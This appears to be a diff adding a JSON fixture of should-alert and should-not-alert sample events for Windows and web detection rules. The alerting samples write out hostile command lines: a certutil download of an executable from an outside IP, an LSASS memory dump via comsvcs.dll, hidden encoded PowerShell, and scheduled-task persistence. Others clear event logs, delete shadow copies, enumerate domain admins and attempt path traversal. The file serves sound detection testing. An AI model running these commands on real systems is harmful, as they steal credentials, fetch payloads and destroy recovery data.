@@ -1,0 +1,83 @@
+{
+"proc_creation_win_office_spawn_shell": {
+ "should_alert": [
+  {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami"},
+  {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop"}],
+ "should_not_alert": [
+  {"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE"},
+  {"ParentImage":"C:\\Windows\\explorer.exe","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe"},
+  {"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE","CommandLine":"ONENOTE.EXE"}]},
+"proc_creation_win_powershell_encoded_command": {
+ "should_alert": [
+  {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgA","ParentImage":"C:\\Windows\\System32\\cmd.exe"},
+  {"Image":"C:\\Program Files\\PowerShell\\7\\pwsh.exe","CommandLine":"pwsh.exe -EncodedCommand SQBFAFgA","ParentImage":"C:\\Windows\\explorer.exe"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -File C:\\IT\\check.ps1","ParentImage":"C:\\Windows\\System32\\cmd.exe"},
+  {"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -enc SQBFAFgA","ParentImage":"C:\\Windows\\CCM\\CcmExec.exe"},
+  {"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c echo -enc","ParentImage":"C:\\Windows\\explorer.exe"}]},
+"proc_creation_win_schtasks_script_persistence": {
+ "should_alert": [
+  {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /create /tn Updater /tr \"powershell.exe -nop -File C:\\Users\\Public\\x.ps1\" /sc onlogon"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /query /fo list"},
+  {"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /create /tn Backup /tr C:\\IT\\check_backup.cmd /sc daily"},
+  {"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c schtasks /create /tr powershell"}]},
+"proc_creation_win_lsass_comsvcs_minidump": {
+ "should_alert": [
+  {"CommandLine":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\l.dmp full"},
+  {"CommandLine":"rundll32 comsvcs.dll #24 704 out.dmp full"}],
+ "should_not_alert": [
+  {"CommandLine":"rundll32.exe shell32.dll,Control_RunDLL"},
+  {"CommandLine":"regsvr32.exe comsvcs.dll"}]},
+"proc_access_win_lsass_suspicious_access": {
+ "should_alert": [
+  {"SourceImage":"C:\\Windows\\System32\\rundll32.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1fffff"},
+  {"SourceImage":"C:\\Users\\Public\\tool.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1010"}],
+ "should_not_alert": [
+  {"SourceImage":"C:\\Windows\\System32\\wininit.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1fffff"},
+  {"SourceImage":"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1410"},
+  {"SourceImage":"C:\\Windows\\System32\\rundll32.exe","TargetImage":"C:\\Windows\\System32\\notepad.exe","GrantedAccess":"0x1fffff"},
+  {"SourceImage":"C:\\Users\\Public\\tool.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x0400"}]},
+"proc_creation_win_wevtutil_clear_logs": {
+ "should_alert": [
+  {"Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil.exe cl Security"},
+  {"Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil.exe clear-log System"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\wevtutil.exe","CommandLine":"wevtutil.exe qe Security /c:5"},
+  {"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c echo wevtutil cl"}]},
+"win_security_log_cleared": {
+ "should_alert": [{"EventID":1102}],
+ "should_not_alert": [{"EventID":4624},{"EventID":4688}]},
+"proc_creation_win_vssadmin_shadow_delete": {
+ "should_alert": [
+  {"Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin.exe delete shadows /all /quiet"},
+  {"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic shadowcopy delete"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin.exe list shadows"},
+  {"Image":"C:\\Windows\\System32\\wbem\\WMIC.exe","CommandLine":"wmic shadowcopy call create Volume=C:\\"}]},
+"proc_creation_win_certutil_download": {
+ "should_alert": [{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -hashfile report.pdf SHA256"},
+  {"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache * delete"}]},
+"proc_creation_win_net_domain_admins_discovery": {
+ "should_alert": [
+  {"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net group \"Domain Admins\" /domain"},
+  {"Image":"C:\\Windows\\System32\\net1.exe","CommandLine":"net1 group \"domain admins\" /domain"}],
+ "should_not_alert": [
+  {"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net use Z: \\\\SRV-FILE-01\\share"},
+  {"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net group \"Helpdesk\" /domain"}]},
+"win_security_rdp_logon_service_account": {
+ "should_alert": [{"EventID":4624,"LogonType":10,"TargetUserName":"svc_backup"}],
+ "should_not_alert": [
+  {"EventID":4624,"LogonType":3,"TargetUserName":"svc_backup"},
+  {"EventID":4624,"LogonType":10,"TargetUserName":"adm_mpark"},
+  {"EventID":4625,"LogonType":10,"TargetUserName":"svc_backup"}]},
+"web_path_traversal_attempt": {
+ "should_alert": [
+  {"c-uri":"/download?file=../../etc/passwd"},
+  {"c-uri":"/files/%2e%2e%2f%2e%2e%2fwindows/win.ini"}],
+ "should_not_alert": [
+  {"c-uri":"/images/logo.png"},
+  {"c-uri":"/reports/2026/q3.pdf?view=full"}]}
+}
